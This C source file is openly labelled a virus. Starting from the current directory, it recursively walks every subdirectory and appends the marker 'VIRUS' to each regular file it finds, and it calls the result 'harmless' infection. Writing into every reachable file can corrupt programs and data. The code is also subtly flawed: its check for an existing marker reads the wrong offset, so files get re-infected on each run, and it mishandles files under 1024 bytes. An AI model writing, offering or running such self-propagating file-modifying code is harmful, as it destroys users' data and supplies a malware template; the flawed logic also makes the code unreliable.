#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

#define VIRUS_SIZE 1024

void notify_infection(const char* filename) {
    printf("File %s has been infected (harmlessly)!\n", filename);
}
void infect_file(const char* filename) {
    FILE* file = fopen(filename, "r+b");
    if (file == NULL) {
        return;
    }
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, file_size - VIRUS_SIZE, SEEK_SET);
    char buffer[VIRUS_SIZE];
    fread(buffer, 1, VIRUS_SIZE, file);
    if (strncmp(buffer, "VIRUS", 5) == 0) {
        fclose(file);
        return;
    }
    fseek(file, 0, SEEK_END);
    fprintf(file, "VIRUS");
    fclose(file);
    notify_infection(filename);
}
void spread_virus(const char* directory) {
    DIR* dir = opendir(directory);
    if (dir == NULL) {
        return;
    }
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filepath[1024];
            snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);
            infect_file(filepath);
        }
        else if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char subdir[1024];
            snprintf(subdir, sizeof(subdir), "%s/%s", directory, entry->d_name);
            spread_virus(subdir);
        }
    }
    closedir(dir);
}


int main() {
    spread_virus(".");
    return 0;
}
